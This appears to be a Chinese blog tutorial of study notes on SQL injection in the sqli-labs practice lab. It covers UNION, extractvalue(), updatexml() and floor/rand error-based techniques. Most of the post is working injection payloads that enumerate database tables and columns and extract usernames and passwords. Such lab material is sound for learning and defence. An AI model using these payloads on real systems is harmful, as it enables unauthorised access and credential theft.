简单的SQL注入2

发表于2026-03-22|更新于2026-07-30|技术
|浏览量:

union注入

讲解

  • 拿到表名和列名
    • 数据库information_schema：包含MySQL数据库的简要信息
    • tables：表名集合表
    • columns：列名集合表

查看security的表名
所需要的信息在数据库information_schema→数据表table→数据列table_name

id=-1’ union select 1,table_name,3 from information_schema.tables --+
过滤在security数据库中的表名，即table_schema为security的行
id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=’security’ --+
这时只能显示一个表名（table_schema=database()查询当前数据库）

id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ --+
group_concat()可以确保所有查询信息可以放到一行显示出来

查看security的列名
所需要的信息在数据库information_schema→数据表columns→数据列column_name

过滤在security数据库中数据表users的表名
id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’users’ --+
并且只查看users的表名内容

查询最后的信息
查询语句：select 列名 from 表名 where 限定语句

id=-1’ union select 1,group_concat(username,’‘,password),3 from users --+
插入分割符\便于区分

数字型union注入

  1. 确定数字型还是字符型
  2. 使用group by的二分法判断union语句中前一个查询的列数
  3. 优化语句，修改id为不存在的数字
  4. 使用select语句，查询靶机数据库库名
  5. 使用select语句，查询靶机所有表名
  6. 使用select语句，查询靶机所有列名
  7. 查询所有用户名密码

报错注入

用户构造语句，让错误信息中夹杂可以显示数据库内容的查询语句给数据库服务器，服务器返回报错提示中包含数据库中的内容。

extractValue()报错注入

介绍

函数extractValue()包含两个参数

  • XML：文档对象名称
  • 路径：查询数据的列

    把查询参数路径写错
    mysql> select extractValue(doc,’/book/author/surnamelll’) from xml
    查询不到内容但是不会报错

    把查询参数格式符号写错
    mysql> select extractValue(doc,’~book/author/surname’) from xml
    会提示报错信息

    select extractvalue(doc,concat(Ox7e,(select database()))) from xml;
    通过报错信息查询数据库名

Less-5的尝试

查询数据库名

?id=100’ union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+
或
?id=100’ and 1=extractvalue(1,concat(0x7e,(select database()))) --+

查询数据表名

?id=100’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema= database()))) --+

获取所需数据列列名

?id=100’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema= database() and table_name=’users’)))--+

查询username和password

?id=100’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,’~’,password) from users))) --+
默认只能返回32个字符

使用函数substring解决只能返回32个字符的问题

?id=100’ and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,’~’,password),25,30) from users))) --+
25,30从第25个字符往后再显示30个字符

UpdateXml报错注入

介绍

函数updatexml(XML_document,XPath_string,new_value)包含三个参数

  • XML_document：是string格式，为XML文档对象的名称
  • XPath_string是路径，XPath格式的字符串
  • new_value：string格式，替换查找的符合条件的数据

报错原理
同extractvalue()，输入错误的第二个参数，即更改路径的符号
>select updatexml(doc,’/book/auther/surname’,’1’)from xml;
>select updatexml(doc,’~book/auther/surname’,’1’)from xml;

Less-4的尝试

查询数据表名

?id=1”) and 1=updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3) --+

  • group_concat()：把查询的结果合并到一行显示
  • concat()：合并字符

获取所需数据列列名

?id=1”) and 1=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’)),3) --+

查询username和password

?id=1”) and 1=updatexml(1,concat(0x7e,(select substring(group_concat(username,’:’,password),1,30) from users)),3) --+
显示1~30个字符

?id=1”) and 1=updatexml(1,concat(0x7e,(select substring(group_concat(username,’:’,password),30,30) from users)),3) --+
显示30~59个字符

floor报错

涉及的函数

  • rand()：随机返回0~1间的小数
  • floor()：小数向下取整数
  • ceiling()：小数向上取整数
  • concat_ws()：将括号内数据用第一个字段连接起来
  • group by子句：分组语句，结合统计函数，根据一个或多个列，对结果集进行分组
  • as：取一个别名
  • count()：汇总统计数量
  • limit：这里用于显示指定行数

    ?id=0’ union select 1,count(*),concat_ws(‘-‘,(select concat(‘~’,id,username,’:’,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+

函数的运用

rand()

concat_ws()
把第二个字符串和第三个字符串用第一个字段连接起来

as别名和group by分组

count()
报错的开始

报错原理

rand()函数进行分组group by和统计count()时可能多次执行，导致键值key（分出的组）重复

database一般使用行数比较多的默认数据表information_schema.tables（一定存在且行数够多），让rand()产生足够的次数的计算

floor注入

?id=0’ union select 1,count(*),concat_ws(‘-‘,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from information_schema.tables group by a --+
修改concat_ws()的第二个参数可以实现floor()注入

?id=0’ union select 1,count(*),concat_ws(‘-‘,(select group_concat(username,’:’,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a --+
使用group_concat无法显示可以尝试concat

?id=0’ union select 1,count(*),concat_ws(‘-‘,(select concat(‘~’,id,username,’:’,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+
limit 0,1：从0开始显示第一行
